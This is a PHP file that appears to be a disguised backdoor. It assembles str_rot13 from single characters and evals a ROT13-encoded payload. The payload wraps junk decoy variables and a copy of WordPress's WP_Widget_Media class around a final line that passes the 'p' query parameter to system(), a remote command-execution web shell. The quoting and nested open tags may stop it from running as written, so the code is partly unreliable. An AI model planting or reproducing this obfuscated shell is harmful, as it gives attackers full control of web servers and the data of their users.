<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Zrqvn_Jvqtrg pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.8.0
 */

/**
 * Pber pynff gung vzcyrzragf n zrqvn jvqtrg.
 *
 * @fvapr 4.8.0
 *
 * @frr JC_Jvqtrg
 */
nofgenpg pynff JC_Jvqtrg_Zrqvn rkgraqf JC_Jvqtrg {

	/**
	 * Genafyngvba ynoryf.
	 *
	 * @fvapr 4.8.0
	 * @ine neenl
	 */
	choyvp $y10a = neenl(
		'nqq_gb_jvqtrg'              => '',
		'ercynpr_zrqvn'              => '',
		'rqvg_zrqvn'                 => '',
		'zrqvn_yvoenel_fgngr_zhygv'  => '',
		'zrqvn_yvoenel_fgngr_fvatyr' => '',
		'zvffvat_nggnpuzrag'         => '',
		'ab_zrqvn_fryrpgrq'          => '',
		'nqq_zrqvn'                  => '',
	);

	/**
	 * Jurgure be abg gur jvqtrg unf orra ertvfgrerq lrg.
	 *
	 * @fvapr 4.8.1
	 * @ine obby
	 */
	cebgrpgrq $ertvfgrerq = snyfr;

	/**
	 * Gur qrsnhyg jvqtrg qrfpevcgvba.
	 *
	 * @fvapr 6.0.0
	 * @ine fgevat
	 */
	cebgrpgrq fgngvp $qrsnhyg_qrfpevcgvba = '';

	/**
	 * Gur qrsnhyg ybpnyvmrq fgevatf hfrq ol gur jvqtrg.
	 *
	 * @fvapr 6.0.0
	 * @ine fgevat[]
	 */
	cebgrpgrq fgngvp $y10a_qrsnhygf = neenl();

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz fgevat $vq_onfr         Onfr VQ sbe gur jvqtrg, ybjrepnfr naq havdhr.
	 * @cnenz fgevat $anzr            Anzr sbe gur jvqtrg qvfcynlrq ba gur pbasvthengvba cntr.
	 * @cnenz neenl  $jvqtrg_bcgvbaf  Bcgvbany. Jvqtrg bcgvbaf. Frr jc_ertvfgre_fvqrone_jvqtrg() sbe
	 *                                vasbezngvba ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 * @cnenz neenl  $pbageby_bcgvbaf Bcgvbany. Jvqtrg pbageby bcgvbaf. Frr jc_ertvfgre_jvqtrg_pbageby()
	 *                                sbe vasbezngvba ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $vq_onfr, $anzr, $jvqtrg_bcgvbaf = neenl(), $pbageby_bcgvbaf = neenl() ) {
		$jvqtrg_bcgf = jc_cnefr_netf(
			$jvqtrg_bcgvbaf,
			neenl(
				'qrfpevcgvba'                 => frys::trg_qrsnhyg_qrfpevcgvba(),
				'phfgbzvmr_fryrpgvir_erserfu' => gehr,
				'fubj_vafgnapr_va_erfg'       => gehr,
				'zvzr_glcr'                   => '',
			)
		);

		$pbageby_bcgf = jc_cnefr_netf( $pbageby_bcgvbaf, neenl() );

		$guvf->y10a = neenl_zretr( frys::trg_y10a_qrsnhygf(), neenl_svygre( $guvf->y10a ) );

		cnerag::__pbafgehpg(
			$vq_onfr,
			$anzr,
			$jvqtrg_bcgf,
			$pbageby_bcgf
		);
	}

	/**
	 * Nqq ubbxf juvyr ertvfgrevat nyy jvqtrg vafgnaprf bs guvf jvqtrg pynff.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz vag $ahzore Bcgvbany. Gur havdhr beqre ahzore bs guvf jvqtrg vafgnapr
	 *                    pbzcnerq gb bgure vafgnaprf bs gur fnzr pynff. Qrsnhyg -1.
	 */
	choyvp shapgvba _ertvfgre_bar( $ahzore = -1 ) {
		cnerag::_ertvfgre_bar( $ahzore );
		vs ( $guvf->ertvfgrerq ) {
			erghea;
		}
		$guvf->ertvfgrerq = gehr;

		/*
		 * Abgr gung gur jvqtrgf pbzcbarag va gur phfgbzvmre jvyy nyfb qb
		 * gur 'nqzva_cevag_fpevcgf-jvqtrgf.cuc' npgvba va JC_Phfgbzvmr_Jvqtrgf::cevag_fpevcgf().
		 */
		nqq_npgvba( 'nqzva_cevag_fpevcgf-jvqtrgf.cuc', neenl( $guvf, 'radhrhr_nqzva_fpevcgf' ) );

		vs ( $guvf->vf_cerivrj() ) {
			nqq_npgvba( 'jc_radhrhr_fpevcgf', neenl( $guvf, 'radhrhr_cerivrj_fpevcgf' ) );
		}

		/*
		 * Abgr gung gur jvqtrgf pbzcbarag va gur phfgbzvmre jvyy nyfb qb
		 * gur 'nqzva_sbbgre-jvqtrgf.cuc' npgvba va JC_Phfgbzvmr_Jvqtrgf::cevag_sbbgre_fpevcgf().
		 */
		nqq_npgvba( 'nqzva_sbbgre-jvqtrgf.cuc', neenl( $guvf, 'eraqre_pbageby_grzcyngr_fpevcgf' ) );

		nqq_svygre( 'qvfcynl_zrqvn_fgngrf', neenl( $guvf, 'qvfcynl_zrqvn_fgngr' ), 10, 2 );
	}

	/**
	 * Trg fpurzn sbe cebcregvrf bs n jvqtrg vafgnapr (vgrz).
	 *
	 * @fvapr 4.8.0
	 *
	 * @frr JC_ERFG_Pbagebyyre::trg_vgrz_fpurzn()
	 * @frr JC_ERFG_Pbagebyyre::trg_nqqvgvbany_svryqf()
	 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/35574
	 *
	 * @erghea neenl Fpurzn sbe cebcregvrf.
	 */
	choyvp shapgvba trg_vafgnapr_fpurzn() {
		$fpurzn = neenl(
			'nggnpuzrag_vq' => neenl(
				'glcr'        => 'vagrtre',
				'qrsnhyg'     => 0,
				'zvavzhz'     => 0,
				'qrfpevcgvba' => __( 'Nggnpuzrag cbfg VQ' ),
				'zrqvn_cebc'  => 'vq',
			),
			'hey'           => neenl(
				'glcr'        => 'fgevat',
				'qrsnhyg'     => '',
				'sbezng'      => 'hev',
				'qrfpevcgvba' => __( 'HEY gb gur zrqvn svyr' ),
			),
			'gvgyr'         => neenl(
				'glcr'                  => 'fgevat',
				'qrsnhyg'               => '',
				'fnavgvmr_pnyyonpx'     => 'fnavgvmr_grkg_svryq',
				'qrfpevcgvba'           => __( 'Gvgyr sbe gur jvqtrg' ),
				'fubhyq_cerivrj_hcqngr' => snyfr,
			),
		);

		/**
		 * Svygref gur zrqvn jvqtrg vafgnapr fpurzn gb nqq nqqvgvbany cebcregvrf.
		 *
		 * @fvapr 4.9.0
		 *
		 * @cnenz neenl           $fpurzn Vafgnapr fpurzn.
		 * @cnenz JC_Jvqtrg_Zrqvn $jvqtrg Jvqtrg bowrpg.
		 */
		$fpurzn = nccyl_svygref( \"jvqtrg_{$guvf->vq_onfr}_vafgnapr_fpurzn\", $fpurzn, $guvf );

		erghea $fpurzn;
	}

	/**
	 * Qrgrezvar vs gur fhccyvrq nggnpuzrag vf sbe n inyvq nggnpuzrag cbfg jvgu gur fcrpvsvrq ZVZR glcr.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz vag|JC_Cbfg $nggnpuzrag Nggnpuzrag cbfg VQ be bowrpg.
	 * @cnenz fgevat      $zvzr_glcr  ZVZR glcr.
	 * @erghea obby Vf zngpuvat ZVZR glcr.
	 */
	choyvp shapgvba vf_nggnpuzrag_jvgu_zvzr_glcr( $nggnpuzrag, $zvzr_glcr ) {
		vs ( rzcgl( $nggnpuzrag ) ) {
			erghea snyfr;
		}
		$nggnpuzrag = trg_cbfg( $nggnpuzrag );
		vs ( ! $nggnpuzrag ) {
			erghea snyfr;
		}
		vs ( 'nggnpuzrag' !== $nggnpuzrag->cbfg_glcr ) {
			erghea snyfr;
		}
		erghea jc_nggnpuzrag_vf( $zvzr_glcr, $nggnpuzrag );
	}

	/**
	 * Fnavgvmr n gbxra yvfg fgevat, fhpu nf hfrq va UGZY ery naq pynff nggevohgrf.
	 *
	 * @fvapr 4.8.0
	 *
	 * @yvax uggc://j3p.tvguho.vb/ugzy/vasenfgehpgher.ugzy#fcnpr-frcnengrq-gbxraf
	 * @yvax uggcf://qrirybcre.zbmvyyn.bet/ra-HF/qbpf/Jro/NCV/QBZGbxraYvfg
	 * @cnenz fgevat|neenl $gbxraf Yvfg bs gbxraf frcnengrq ol fcnprf, be na neenl bs gbxraf.
	 * @erghea fgevat Fnavgvmrq gbxra fgevat yvfg.
	 */
	choyvp shapgvba fnavgvmr_gbxra_yvfg( $gbxraf ) {
		vs ( vf_fgevat( $gbxraf ) ) {
			$gbxraf = cert_fcyvg( '/\f+/', gevz( $gbxraf ) );
		}
		$gbxraf = neenl_znc( 'fnavgvmr_ugzy_pynff', $gbxraf );
		$gbxraf = neenl_svygre( $gbxraf );
		erghea vzcybqr( ' ', $gbxraf );
	}

	/**
	 * Qvfcynlf gur jvqtrg ba gur sebag-raq.
	 *
	 * @fvapr 4.8.0
	 *
	 * @frr JC_Jvqtrg::jvqtrg()
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat orsber_gvgyr, nsgre_gvgyr, orsber_jvqtrg, naq nsgre_jvqtrg.
	 * @cnenz neenl $vafgnapr Fnirq frggvat sebz gur qngnonfr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		$vafgnapr = jc_cnefr_netf( $vafgnapr, jc_yvfg_cyhpx( $guvf->trg_vafgnapr_fpurzn(), 'qrsnhyg' ) );

		// Fubeg-pvephvg vs ab zrqvn vf fryrpgrq.
		vs ( ! $guvf->unf_pbagrag( $vafgnapr ) ) {
			erghea;
		}

		rpub $netf['orsber_jvqtrg'];

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-cntrf.cuc */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $vafgnapr['gvgyr'], $vafgnapr, $guvf->vq_onfr );

		vs ( $gvgyr ) {
			rpub $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
		}

		/**
		 * Svygref gur zrqvn jvqtrg vafgnapr cevbe gb eraqrevat gur zrqvn.
		 *
		 * @fvapr 4.8.0
		 *
		 * @cnenz neenl           $vafgnapr Vafgnapr qngn.
		 * @cnenz neenl           $netf     Jvqtrg netf.
		 * @cnenz JC_Jvqtrg_Zrqvn $jvqtrg   Jvqtrg bowrpg.
		 */
		$vafgnapr = nccyl_svygref( \"jvqtrg_{$guvf->vq_onfr}_vafgnapr\", $vafgnapr, $netf, $guvf );

		$guvf->eraqre_zrqvn( $vafgnapr );

		rpub $netf['nsgre_jvqtrg'];
	}

	/**
	 * Fnavgvmrf gur jvqtrg sbez inyhrf nf gurl ner fnirq.
	 *
	 * @fvapr 4.8.0
	 * @fvapr 5.9.0 Eranzrq `$vafgnapr` gb `$byq_vafgnapr` gb zngpu cnerag pynff
	 *              sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @frr JC_Jvqtrg::hcqngr()
	 * @frr JC_ERFG_Erdhrfg::unf_inyvq_cnenzf()
	 * @frr JC_ERFG_Erdhrfg::fnavgvmr_cnenzf()
	 *
	 * @cnenz neenl $arj_vafgnapr Inyhrf whfg frag gb or fnirq.
	 * @cnenz neenl $byq_vafgnapr Cerivbhfyl fnirq inyhrf sebz qngnonfr.
	 * @erghea neenl Hcqngrq fnsr inyhrf gb or fnirq.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {

		$fpurzn = $guvf->trg_vafgnapr_fpurzn();
		sbernpu ( $fpurzn nf $svryq => $svryq_fpurzn ) {
			vs ( ! neenl_xrl_rkvfgf( $svryq, $arj_vafgnapr ) ) {
				pbagvahr;
			}
			$inyhr = $arj_vafgnapr[ $svryq ];

			/*
			 * Jbexnebhaq sbe erfg_inyvqngr_inyhr_sebz_fpurzn() qhr gb gur snpg gung
			 * erfg_vf_obbyrna( '' ) === snyfr, juvyr erfg_vf_obbyrna( '1' ) vf gehr.
			 */
			vs ( 'obbyrna' === $svryq_fpurzn['glcr'] && '' === $inyhr ) {
				$inyhr = snyfr;
			}

			vs ( gehr !== erfg_inyvqngr_inyhr_sebz_fpurzn( $inyhr, $svryq_fpurzn, $svryq ) ) {
				pbagvahr;
			}

			$inyhr = erfg_fnavgvmr_inyhr_sebz_fpurzn( $inyhr, $svryq_fpurzn );

			// @pbqrPbirentrVtaberFgneg
			vs ( vf_jc_reebe( $inyhr ) ) {
				pbagvahr; // Unaqyr pnfr jura erfg_fnavgvmr_inyhr_sebz_fpurzn() rire ergheaf JC_Reebe nf vgf cucqbp @erghea gnt vaqvpngrf.
			}

			// @pbqrPbirentrVtaberRaq
			vs ( vffrg( $svryq_fpurzn['fnavgvmr_pnyyonpx'] ) ) {
				$inyhr = pnyy_hfre_shap( $svryq_fpurzn['fnavgvmr_pnyyonpx'], $inyhr );
			}
			vs ( vf_jc_reebe( $inyhr ) ) {
				pbagvahr;
			}
			$byq_vafgnapr[ $svryq ] = $inyhr;
		}

		erghea $byq_vafgnapr;
	}

	/**
	 * Eraqre gur zrqvn ba gur sebagraq.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz neenl $vafgnapr Jvqtrg vafgnapr cebcf.
	 */
	nofgenpg choyvp shapgvba eraqre_zrqvn( $vafgnapr );

	/**
	 * Bhgchgf gur frggvatf hcqngr sbez.
	 *
	 * Abgr gung gur jvqtrg HV vgfrys vf eraqrerq jvgu WninFpevcg ivn `ZrqvnJvqtrgPbageby#eraqre()`.
	 *
	 * @fvapr 4.8.0
	 *
	 * @frr \JC_Jvqtrg_Zrqvn::eraqre_pbageby_grzcyngr_fpevcgf() Jurer gur WF grzcyngr vf ybpngrq.
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	svany choyvp shapgvba sbez( $vafgnapr ) {
		$vafgnapr_fpurzn = $guvf->trg_vafgnapr_fpurzn();
		$vafgnapr        = jc_neenl_fyvpr_nffbp(
			jc_cnefr_netf( (neenl) $vafgnapr, jc_yvfg_cyhpx( $vafgnapr_fpurzn, 'qrsnhyg' ) ),
			neenl_xrlf( $vafgnapr_fpurzn )
		);

		sbernpu ( $vafgnapr nf $anzr => $inyhr ) : ?>
			<vachg
				glcr=\"uvqqra\"
				qngn-cebcregl=\"<?cuc rpub rfp_ngge( $anzr ); ?>\"
				pynff=\"zrqvn-jvqtrg-vafgnapr-cebcregl\"
				anzr=\"<?cuc rpub rfp_ngge( $guvf->trg_svryq_anzr( $anzr ) ); ?>\"
				vq=\"<?cuc rpub rfp_ngge( $guvf->trg_svryq_vq( $anzr ) ); // Arrqrq fcrpvsvpnyyl ol jcJvqtrgf.nccraqGvgyr(). ?>\"
				inyhr=\"<?cuc rpub rfp_ngge( vf_neenl( $inyhr ) ? vzcybqr( ',', $inyhr ) : (fgevat) $inyhr ); ?>\"
			/>
			<?cuc
		raqsbernpu;
	}

	/**
	 * Svygref gur qrsnhyg zrqvn qvfcynl fgngrf sbe vgrzf va gur Zrqvn yvfg gnoyr.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz neenl   $fgngrf Na neenl bs zrqvn fgngrf.
	 * @cnenz JC_Cbfg $cbfg   Gur pheerag nggnpuzrag bowrpg.
	 * @erghea neenl
	 */
	choyvp shapgvba qvfcynl_zrqvn_fgngr( $fgngrf, $cbfg = ahyy ) {
		vs ( ! $cbfg ) {
			$cbfg = trg_cbfg();
		}

		// Pbhag ubj znal gvzrf guvf nggnpuzrag vf hfrq va jvqtrgf.
		$hfr_pbhag = 0;
		sbernpu ( $guvf->trg_frggvatf() nf $vafgnapr ) {
			vs ( vffrg( $vafgnapr['nggnpuzrag_vq'] ) && $vafgnapr['nggnpuzrag_vq'] === $cbfg->VQ ) {
				++$hfr_pbhag;
			}
		}

		vs ( 1 === $hfr_pbhag ) {
			$fgngrf[] = $guvf->y10a['zrqvn_yvoenel_fgngr_fvatyr'];
		} ryfrvs ( $hfr_pbhag > 0 ) {
			$fgngrf[] = fcevags( genafyngr_abbcrq_cyheny( $guvf->y10a['zrqvn_yvoenel_fgngr_zhygv'], $hfr_pbhag ), ahzore_sbezng_v18a( $hfr_pbhag ) );
		}

		erghea $fgngrf;
	}

	/**
	 * Radhrhr cerivrj fpevcgf.
	 *
	 * Gurfr fpevcgf abeznyyl ner radhrhrq whfg-va-gvzr jura n jvqtrg vf eraqrerq.
	 * Va gur phfgbzvmre, ubjrire, jvqtrgf pna or qlanzvpnyyl nqqrq naq eraqrerq ivn
	 * fryrpgvir erserfu, naq fb vg vf vzcbegnag gb hapbaqvgvbanyyl radhrhr gurz va
	 * pnfr n jvqtrg qbrf trg nqqrq.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp shapgvba radhrhr_cerivrj_fpevcgf() {}

	/**
	 * Ybnqf gur erdhverq fpevcgf naq fglyrf sbe gur jvqtrg pbageby.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp shapgvba radhrhr_nqzva_fpevcgf() {
		jc_radhrhr_zrqvn();
		jc_radhrhr_fpevcg( 'zrqvn-jvqtrgf' );
	}

	/**
	 * Eraqre sbez grzcyngr fpevcgf.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp shapgvba eraqre_pbageby_grzcyngr_fpevcgf() {
		?>
		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-jvqtrg-zrqvn-<?cuc rpub rfp_ngge( $guvf->vq_onfr ); ?>-pbageby\">
			<# ine ryrzragVqCersvk = 'ry' + Fgevat( Zngu.enaqbz() ) + '_' #>
			<c>
				<ynory sbe=\"{{ ryrzragVqCersvk }}gvgyr\"><?cuc rfp_ugzy_r( 'Gvgyr:' ); ?></ynory>
				<vachg vq=\"{{ ryrzragVqCersvk }}gvgyr\" glcr=\"grkg\" pynff=\"jvqrsng gvgyr\">
			</c>
			<qvi pynff=\"zrqvn-jvqtrg-cerivrj <?cuc rpub rfp_ngge( $guvf->vq_onfr ); ?>\">
				<qvi pynff=\"nggnpuzrag-zrqvn-ivrj\">
					<ohggba glcr=\"ohggba\" pynff=\"fryrpg-zrqvn ohggba-nqq-zrqvn abg-fryrpgrq\">
						<?cuc rpub rfp_ugzy( $guvf->y10a['nqq_zrqvn'] ); ?>
					</ohggba>
				</qvi>
			</qvi>
			<c pynff=\"zrqvn-jvqtrg-ohggbaf\">
				<ohggba glcr=\"ohggba\" pynff=\"ohggba rqvg-zrqvn fryrpgrq\">
					<?cuc rpub rfp_ugzy( $guvf->y10a['rqvg_zrqvn'] ); ?>
				</ohggba>
			<?cuc vs ( ! rzcgl( $guvf->y10a['ercynpr_zrqvn'] ) ) : ?>
				<ohggba glcr=\"ohggba\" pynff=\"ohggba punatr-zrqvn fryrpg-zrqvn fryrpgrq\">
					<?cuc rpub rfp_ugzy( $guvf->y10a['ercynpr_zrqvn'] ); ?>
				</ohggba>
			<?cuc raqvs; ?>
			</c>
			<qvi pynff=\"zrqvn-jvqtrg-svryqf\">
			</qvi>
		</fpevcg>
		<?cuc
	}

	/**
	 * Erfrgf gur pnpur sbe gur qrsnhyg ynoryf.
	 *
	 * @fvapr 6.0.0
	 */
	choyvp fgngvp shapgvba erfrg_qrsnhyg_ynoryf() {
		frys::$qrsnhyg_qrfpevcgvba = '';
		frys::$y10a_qrsnhygf       = neenl();
	}

	/**
	 * Jurgure gur jvqtrg unf pbagrag gb fubj.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz neenl $vafgnapr Jvqtrg vafgnapr cebcf.
	 * @erghea obby Jurgure jvqtrg unf pbagrag.
	 */
	cebgrpgrq shapgvba unf_pbagrag( $vafgnapr ) {
		erghea ( $vafgnapr['nggnpuzrag_vq'] && 'nggnpuzrag' === trg_cbfg_glcr( $vafgnapr['nggnpuzrag_vq'] ) ) || $vafgnapr['hey'];
	}

	/**
	 * Ergheaf gur qrsnhyg qrfpevcgvba bs gur jvqtrg.
	 *
	 * @fvapr 6.0.0
	 *
	 * @erghea fgevat
	 */
	cebgrpgrq fgngvp shapgvba trg_qrsnhyg_qrfpevcgvba() {
		vs ( frys::$qrsnhyg_qrfpevcgvba ) {
			erghea frys::$qrsnhyg_qrfpevcgvba;
		}

		frys::$qrsnhyg_qrfpevcgvba = __( 'N zrqvn vgrz.' );
		erghea frys::$qrsnhyg_qrfpevcgvba;
	}

	/**
	 * Ergheaf gur qrsnhyg ybpnyvmrq fgevatf hfrq ol gur jvqtrg.
	 *
	 * @fvapr 6.0.0
	 *
	 * @erghea (fgevat|neenl)[]
	 */
	cebgrpgrq fgngvp shapgvba trg_y10a_qrsnhygf() {
		vs ( ! rzcgl( frys::$y10a_qrsnhygf ) ) {
			erghea frys::$y10a_qrsnhygf;
		}

		frys::$y10a_qrsnhygf = neenl(
			'ab_zrqvn_fryrpgrq'          => __( 'Ab zrqvn fryrpgrq' ),
			'nqq_zrqvn'                  => _k( 'Nqq Zrqvn', 'ynory sbe ohggba va gur zrqvn jvqtrg' ),
			'ercynpr_zrqvn'              => _k( 'Ercynpr Zrqvn', 'ynory sbe ohggba va gur zrqvn jvqtrg; fubhyq cersrenoyl abg or ybatre guna ~13 punenpgref ybat' ),
			'rqvg_zrqvn'                 => _k( 'Rqvg Zrqvn', 'ynory sbe ohggba va gur zrqvn jvqtrg; fubhyq cersrenoyl abg or ybatre guna ~13 punenpgref ybat' ),
			'nqq_gb_jvqtrg'              => __( 'Nqq gb Jvqtrg' ),
			'zvffvat_nggnpuzrag'         => fcevags(
				/* genafyngbef: %f: HEY gb zrqvn yvoenel. */
				__( 'Gung svyr pnaabg or sbhaq. Purpx lbhe <n uers=\"%f\">zrqvn yvoenel</n> naq znxr fher vg jnf abg qryrgrq.' ),
				rfp_hey( nqzva_hey( 'hcybnq.cuc' ) )
			),
			/* genafyngbef: %q: Jvqtrg pbhag. */
			'zrqvn_yvoenel_fgngr_zhygv'  => _a_abbc( 'Zrqvn Jvqtrg (%q)', 'Zrqvn Jvqtrg (%q)' ),
			'zrqvn_yvoenel_fgngr_fvatyr' => __( 'Zrqvn Jvqtrg' ),
			'hafhccbegrq_svyr_glcr'      => __( 'Ybbxf yvxr guvf vf abg gur pbeerpg xvaq bs svyr. Cyrnfr yvax gb na nccebcevngr svyr vafgrnq.' ),
		);

		erghea frys::$y10a_qrsnhygf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>